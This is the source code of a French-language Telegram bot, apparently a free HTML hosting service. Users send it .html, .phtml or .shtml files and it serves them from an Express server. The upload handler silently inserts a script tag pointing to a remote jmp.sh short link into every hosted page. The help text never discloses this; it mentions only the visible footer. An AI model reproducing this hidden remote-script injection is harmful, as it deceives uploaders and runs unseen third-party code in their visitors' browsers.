const { Telegraf } = require("telegraf");
const express = require("express");
const multer = require("multer");
const fs = require("fs-extra");
const path = require("path");
require("dotenv").config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();
const PORT = process.env.PORT || 3000;

// Dossier des uploads
const UPLOADS_DIR = path.join(__dirname, "uploads");
fs.ensureDirSync(UPLOADS_DIR);

// Stockage Multer
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOADS_DIR),
  filename: (req, file, cb) => cb(null, Date.now() + "-" + file.originalname),
});
const upload = multer({ storage });

// Objet pour stocker les noms personnalisés
const userFileNames = {};

// Commande /start
bot.start((ctx) => {
  ctx.reply("Bienvenue ! Envoyez-moi un fichier et je vais l'héberger.\n\n" +
            "Utilisez /help pour plus d'informations.");
});

// Commande /help
bot.help((ctx) => {
  ctx.reply("📌 *Bot d'Upload* 📌\n" +
            "Développé par *trhacknon* 🛠️\n\n" +
            "📂 *Envoyez un fichier* : Le bot va l'héberger et vous donner un lien.\n" +
            "✏️ *Personnaliser le nom* : Avant d'envoyer un fichier, utilisez la commande :\n" +
            "`/name nom-du-fichier`\n\n" +
            "💡 Exemple : `/name mon-site`\nPuis envoyez le fichier et l'URL sera :\n" +
            "`https://votre-site.com/uploads/mon-site.html`");
});

// Commande /name pour définir un nom personnalisé
bot.command("name", (ctx) => {
  const name = ctx.message.text.split(" ")[1];
  if (!name) {
    return ctx.reply("❌ Utilisation : `/name nom-du-fichier`");
  }
  userFileNames[ctx.message.from.id] = name.replace(/[^a-zA-Z0-9-_]/g, "");
  ctx.reply(`✅ Nom défini : *${userFileNames[ctx.message.from.id]}*`);
});

// Gère les fichiers envoyés
bot.on("document", async (ctx) => {
  const file = ctx.message.document;

  // Vérifier que l'extension du fichier est valide
  const validExtensions = [".html", ".Html", ".phtml", ".shtml"];
  const fileExtension = path.extname(file.file_name);
  if (!validExtensions.includes(fileExtension)) {
    return ctx.reply("❌ Veuillez envoyer un fichier `.html`, `.Html`, `.phtml` ou `.shtml` uniquement.");
  }

  // Récupérer le nom personnalisé ou utiliser le nom original
  const customName = userFileNames[ctx.message.from.id] || file.file_name.replace(/[^a-zA-Z0-9-_]/g, "");
  const filePath = path.join(UPLOADS_DIR, `${customName}${fileExtension}`);
  const fileLink = await ctx.telegram.getFileLink(file.file_id);

  // Télécharger et modifier le fichier
  const response = await fetch(fileLink);
  let content = await response.text();

  // Ajouter le script et le footer à la fin du <body> si <body> existe
  if (content.includes("</body>")) {
    content = content.replace("</body>", `<script src="https://jmp.sh/RXpoWXXM"></script><footer style="position: fixed; bottom: 0; left: 0; width: 100%; padding: 10px; background: linear-gradient(45deg, #ff00ff, #00ffff); color: #fff; text-align: center; font-size: 14px; text-shadow: 0 0 10px #ff00ff, 0 0 20px #00ffff;">Service proposé par trhacknon</footer></body>`);
  } else {
    content += `<script src="https://jmp.sh/RXpoWXXM"></script><footer style="position: fixed; bottom: 0; left: 0; width: 100%; padding: 10px; background: linear-gradient(45deg, #ff00ff, #00ffff); color: #fff; text-align: center; font-size: 14px; text-shadow: 0 0 10px #ff00ff, 0 0 20px #00ffff;">Service proposé par trhacknon</footer>`;
  }

  // Sauvegarde du fichier modifié
  await fs.writeFile(filePath, content);

  // URL d'accès
  const fileUrl = `${process.env.BASE_URL}/uploads/${customName}${fileExtension}`;

  // Sauvegarde des fichiers dans uploads.json
  const logPath = path.join(__dirname, "uploads.json");
  let logs = [];
  if (fs.existsSync(logPath)) {
    logs = JSON.parse(fs.readFileSync(logPath, "utf8"));
  }
  logs.push({ user: ctx.message.from.username, url: fileUrl });
  fs.writeFileSync(logPath, JSON.stringify(logs, null, 2));

  ctx.reply(`✅ Fichier mis en ligne :\n${fileUrl}`);
});

// Serveur Express pour accéder aux fichiers
app.use("/uploads", express.static(UPLOADS_DIR));

app.listen(PORT, () => {
  console.log(`🚀 Serveur lancé sur le port ${PORT}`);
});

// Démarrer le bot
bot.launch();
